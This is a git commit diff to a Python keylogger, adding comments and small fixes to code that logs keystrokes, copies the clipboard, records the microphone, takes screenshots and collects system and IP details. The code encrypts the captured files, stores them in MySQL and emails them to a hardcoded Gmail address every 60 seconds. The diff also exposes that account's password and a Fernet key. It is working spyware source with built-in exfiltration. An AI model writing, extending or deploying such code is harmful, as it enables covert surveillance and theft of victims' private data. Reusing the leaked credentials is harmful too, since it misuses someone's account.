57379c3c5a5b9c845526758b1c2322016ce874e1
rutik555 <121005134+rutik555@users.noreply.github.com>
2024-05-26 21:26:48 +0530

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -20,32 +20,36 @@ from datetime import datetime
 from multiprocessing import process, freeze_support
 import threading
 
+# File names for storing logs and data
 keys_information = "key_log.txt"
 system_information = "systminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
+# Encrypted file names
 keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 
+# Email credentials
 email_address = "keyloggerproject55@gmail.com"
 password = "gcvsgmpruffwggzb"
 toaddr = "keyloggerproject55@gmail.com"
 
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
-username = getpass.getuser()
+# Recording and iteration settings
+microphone_time = 10  # Duration for microphone recording
+time_iteration = 15   # Time interval for iterations
+number_of_iterations_end = 3  # Number of iterations
+username = getpass.getuser()  # Get the username of the current user
 
+# File path setup
 file_path = os.path.abspath(os.path.dirname(__file__))
 extend = "\\"
 file_merge = os.path.join(file_path, extend)
-os.makedirs(file_merge, exist_ok=True)
+os.makedirs(file_merge, exist_ok=True)  # Create directory if it does not exist
 
-# Define encryption key
-
+# Encryption key and cipher suite setup
 encryption_key = 'LDtGBp9DMpHh7CROYmkhaEx5Dt9VhW-dVijLS4oBmrw='
 cipher_suite = Fernet(encryption_key)
 
@@ -62,11 +66,12 @@ if connection.is_connected():
     print("Connected to MySQL!")
     cursor = connection.cursor()
 
+# Function to store file data in MySQL
 def store_in_mysql(filename):
     with open(os.path.join(file_path, filename), 'rb') as f:
         data = f.read()
 
-    encrypted_data = cipher_suite.encrypt(data)
+    encrypted_data = cipher_suite.encrypt(data)  # Encrypt data
     current_datetime = datetime.now()
 
     # Prepend timestamp to the filename
@@ -81,8 +86,7 @@ def store_in_mysql(filename):
     except mysql.connector.Error as err:
         print(f"Error storing file '{filename}' in the database:", err)
 
-
-
+# Function to send email with attachment
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
     msg = MIMEMultipart()
@@ -129,28 +133,31 @@ def send_encrypted_email(filename, toaddr):
     encrypted_attachment_path = encrypt_file(filename)
     send_email(filename + '.encrypted', encrypted_attachment_path, toaddr)
     os.remove(encrypted_attachment_path)  # Remove the encrypted file after sending
-    os.remove(filename)  # remove the Unencrypted file after sending
+    os.remove(filename)  # Remove the unencrypted file after sending
 
+# Function to gather and log system information
 def computer_information():
     with open(os.path.join(file_path, system_information), "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
-            f.write("public IP Address:" + public_ip)
+            f.write("public IP Address: " + public_ip + "\n")
         except Exception:
-            f.write("couldn't get Public IP Address (most likely max query")
+            f.write("Couldn't get Public IP Address (most likely max query)\n")
 
-        f.write("processor:" + (platform.processor()) + "\n")
-        f.write("system:" + platform.system() + " " + platform.version() + "\n")
-        f.write("machine: " + platform.machine() + "\n")
-        f.write("Hostname:" + hostname + "\n")
-        f.write("private IP Address: " + IPAddr + "\n")
+        f.write("Processor: " + platform.processor() + "\n")
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
 
+# Gather and send system information
 computer_information()
 store_in_mysql(system_information)
 send_encrypted_email(system_information, toaddr)
 
+# Function to copy clipboard data
 def copy_clipboard():
     with open(os.path.join(file_path, clipboard_information), "a") as f:
         try:
@@ -158,32 +165,37 @@ def copy_clipboard():
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            f.write("clipboard Data: \n" + pasted_data)
+            f.write("Clipboard Data: \n" + pasted_data + "\n")
 
         except:
-            f.write("Clipboard could not be copied")
+            f.write("Clipboard could not be copied\n")
 
+# Gather and send clipboard information
 copy_clipboard()
 store_in_mysql(clipboard_information)
 send_encrypted_email(clipboard_information, toaddr)
 
+# Function to record audio
 def microphone():
-    fs = 44100
-    second = microphone_time
+    fs = 44100  # Sample rate
+    seconds = microphone_time
 
-    myrecording = sd.rec(int(second * fs), samplerate=fs, channels=2)
-    sd.wait()
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()  # Wait until recording is finished
 
-    write(os.path.join(file_path, audio_information), fs, myrecording)
+    write(os.path.join(file_path, audio_information), fs, myrecording)  # Save as WAV file
 
+# Record and send audio information
 microphone()
 store_in_mysql(audio_information)
 send_encrypted_email(audio_information, toaddr)
 
+# Function to capture a screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(os.path.join(file_path, screenshot_information))
 
+# Capture and send screenshot information
 screenshot()
 store_in_mysql(screenshot_information)
 send_encrypted_email(screenshot_information, toaddr)
@@ -193,7 +205,7 @@ def send_keys_information_periodically():
     while True:
         store_in_mysql(keys_information)
         send_encrypted_email(keys_information, toaddr)
-        time.sleep(60)  # Send every 10 minutes
+        time.sleep(60)  # Send every 60 seconds
 
 # Start the thread to send keys information periodically
 keys_info_thread = threading.Thread(target=send_keys_information_periodically)
@@ -205,6 +217,7 @@ if not os.path.exists(os.path.join(file_path, keys_information)):
     with open(os.path.join(file_path, keys_information), 'w'):
         pass  # Create an empty file
 
+# Main loop to log keystrokes and send data periodically
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
@@ -219,7 +232,7 @@ while number_of_iterations < number_of_iterations_end:
         print(key)
         keys.append(key)
         count += 1
-        currentTime + time.time()
+        currentTime = time.time()
 
         if count >= 1:
             count = 0
@@ -264,6 +277,7 @@ while number_of_iterations < number_of_iterations_end:
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
+# Files to encrypt and send
 files_to_encrypt = [os.path.join(file_merge, system_information), os.path.join(file_merge, clipboard_information), os.path.join(file_merge, keys_information)]
 encrypted_file_names = [os.path.join(file_merge, system_information_e), os.path.join(file_merge, clipboard_information_e), os.path.join(file_merge, keys_information_e)]
 
@@ -282,4 +296,5 @@ for encrypting_file in files_to_encrypt:
     send_encrypted_email(encrypted_file_names[count], toaddr)
     count += 1
 
+# Sleep for 120 seconds before ending
 time.sleep(120)
